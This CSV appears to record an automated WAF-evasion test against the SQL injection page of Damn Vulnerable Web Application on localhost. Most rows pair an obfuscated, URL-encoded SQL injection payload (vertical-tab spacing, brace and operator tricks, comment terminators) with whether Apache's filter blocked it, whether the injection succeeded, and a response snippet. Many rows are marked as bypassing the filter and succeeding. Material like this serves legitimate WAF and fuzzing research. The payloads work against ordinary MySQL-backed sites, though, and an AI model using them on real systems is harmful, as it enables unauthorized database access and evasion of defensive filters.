Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0%27or%0b1<@.+||%0bnot+{x+(select%0b1)}=1=%0b(not,Bypassed,Yes,Yes (unionAtk),Unknown,0.0366,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0b!+{a+1}=1=+(not+{x%0b(select,Bypassed,No,None,Unknown,0.029,70.71,No,500,
0%27<@!=.1%0b||%0bnot+{x%0b(select%0b1)}=1=%0b(!%0b{a,Bypassed,Yes,Yes (unionAtk),Unknown,0.015,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||+not+{`if`+1}=1=%0b(not+true),Bypassed,Yes,Yes (unionAtk),Unknown,0.0231,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor%0bnot+{x%0b(select+1)}=1=+(!+{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0193,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||%0bnot%0b{`if`+1}=1=%0b(not%0b{x+(select,Bypassed,No,None,Unknown,0.0258,70.71,No,500,
0'<@!=1.+||%0bnot+1=+(!+1)+||,Blocked,No,None,Unknown,0.0196,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1%0bor%0bnot+{a%0b1}=1=+(!%0b{x%0b(select,Bypassed,No,None,Unknown,0.0248,70.86,No,500,
0%27<@!=.1+or%0bnot+{x%0b(select+1)}=1=%0b(not%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0108,71.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||%0b!+{a%0b1}=1=+(not%7efalse),Bypassed,Yes,Yes (unionAtk),Unknown,0.0374,71.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||%0bnot%0b{x%0b(select+1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0306,71.01,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+or%0b!+{a+1}=1=%0b(not%0b{a+1}=1,Bypassed,No,None,Unknown,0.0203,71.01,No,500,
0'<@=1.%0b||%0bnot+{x%0b(select%0b1)}=1=%0b(not+,Bypassed,No,None,Unknown,0.0313,71.01,No,500,
0'<@=.1+or+not%0b{`if`+1}=1=%0b(not~0),Bypassed,No,None,Unknown,0.0347,71.01,No,500,
0'<@!=.1+||+0=%0b(not%0b{x%0b(select+1)}=1),Bypassed,No,None,Unknown,0.0211,71.01,No,500,
0%27<@=.1+||%0bnot%0b{x%0b(select+1)}=1=%0b(!+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0226,71.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0b||%0bnot%0b{`if`+1}=1=%0b(!%0b{a%0b1}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0186,71.01,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+!%0btrue=%0b(!+{`if`+1}=1),Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0235,71.12,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or%0b!%0b{x+(select%0b1)}=1=+(!+,Blocked,No,None,Unknown,0.0175,71.24,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=1+or+not+{x+(select%0b1)}=1=+(not+{`if`,Blocked,No,None,Unknown,0.0147,71.24,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1%0b||+not%0b{`if`%0b1}=1=+(not+{x%0b,Bypassed,No,None,Unknown,0.0271,71.24,No,500,
0'<@=1.%0bor+!%0b1=%0b(not+{`if`+1}=1),Bypassed,No,None,Unknown,0.0402,71.27,No,500,
0%27<@=1.+or+!%0b1=%0b(!+true)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0471,71.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+||+not%0b{x%0b(select%0b1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0203,69.66,No,500,
0'<@=.1+||+not%0b{x%0b(select+1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0152,70.1,No,500,
0%27<@!=.1%0bor+not+{x+(select+1)}=1=+(!+{a,Bypassed,Yes,Yes (unionAtk),Unknown,0.0261,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+not+{x%0b(select%0b1)}=1=%0b(not+{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0325,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+or%0bnot%0b{x%0b(select%0b1)}=1=+(not%0b{a,Blocked,No,None,Unknown,0.0089,70.1,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1%0bor%0b!+{x+(select+1)}=1=%0b(!%0b1,Bypassed,No,None,Unknown,0.0228,70.1,No,500,
0%27<@!=1%0b||%0bnot%0b{x%0b(select%0b1)}=1=+(!+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0177,70.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+!+{a%0b1}=1=+(not%7efalse),Bypassed,No,None,Unknown,0.0334,70.1,No,500,
0%27<@!=.1+or%0b!+{x+(select+1)}=1=+(!~false,Blocked,No,None,booleanAtk,0.0184,70.1,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or%0b!+{x%0b(select%0b1)}=1=+(!+,Bypassed,No,None,Unknown,0.0132,70.1,No,500,
0'<@=1.%0bor%0b{x%0b(select%0b1)}=1+like+{x+(select%0b1)}=1%0b,Bypassed,No,None,Unknown,0.0231,70.1,No,500,
0'<@=1.+||+{x+(select+1)}=1+like%0b{x%0b(select+1)}=1%23,Blocked,No,None,piggyAtk,0.0262,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=.1%0bor%0bnot+{`if`%0b1}=1=+(!+{x+(select,Bypassed,No,None,Unknown,0.0223,70.71,No,500,
0%27<@!=.1+or%0b!+{`if`+1}=1=+(!%0b{a+1}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.028,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+||+not+{a+1}=1=%0b(!%0b{x+(select,Bypassed,No,None,Unknown,0.0384,70.71,No,500,
0%27<@=1+or+not%0b{`if`+1}=1=%0b(not%0btrue),Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0474,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+{x%0b(select%0b1)}=1%0blike%0b{`if`+1}=1+||',Bypassed,No,None,Unknown,0.0304,70.71,No,500,
0%27<@!=1+||+not%0b1=+(!+true)%0bor,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0229,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0b||+!%0b1=+(!+{x+(select%0b1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0252,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or+{`if`%0b1}=1+like%0b{x%0b(select+1)}=1%0bor',Bypassed,No,None,Unknown,0.0158,70.71,No,500,
0'<@=1.%0bor%0bnot%0b{a%0b1}=1=+(not+{x%0b(select,Bypassed,No,None,Unknown,0.0302,70.71,No,500,
0'<@!=1.%0b||%0bnot%0b1=+(!%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0202,70.71,No,500,
0'<@=1.+||%0bnot%0b{a+1}=1=+(not+{a%0b,Bypassed,No,None,Unknown,0.0149,70.71,No,500,
0%27||%0b1<@+||+{a%0b1}=1%0blike%0b{x%0b(select+1)}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0143,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+not+true=+(!%0b{`if`%0b1}=1),Bypassed,No,None,Unknown,0.0255,70.71,No,500,
0'<@=.1+||+not+{`if`%0b1}=1=+(not%0b{x+(select,Bypassed,No,None,Unknown,0.0166,70.71,No,500,
0%27<@=.1+or%0b!+{x+(select+1)}=1=%0b(!+true,Blocked,No,None,booleanAtk,0.0497,70.71,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.+or%0b!+1=+(not%0b{a%0b1}=1),Bypassed,No,None,Unknown,0.034,70.71,No,500,
0'<@=1.+or+not+{`if`+1}=1=%0b(!%0b{x%0b(select,Bypassed,No,None,Unknown,0.059,70.71,No,500,
0%27<@=.1+or%0bnot+{`if`%0b1}=1=%0b(not+{x+(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0304,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1%0bor+!+{x+(select%0b1)}=1=%0b(!+,Bypassed,No,None,Unknown,0.0257,70.71,No,500,
0%27<@!=.1%0b||%0bnot%0b{x+(select+1)}=1=+(false),Bypassed,Yes,Yes (unionAtk),Unknown,0.0208,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+or%0bnot%0btrue=+(!%0b{x%0b(select+1)}=1,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0461,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor+!%0btrue=+(!+{a%0b1}=1),Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0238,70.71,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
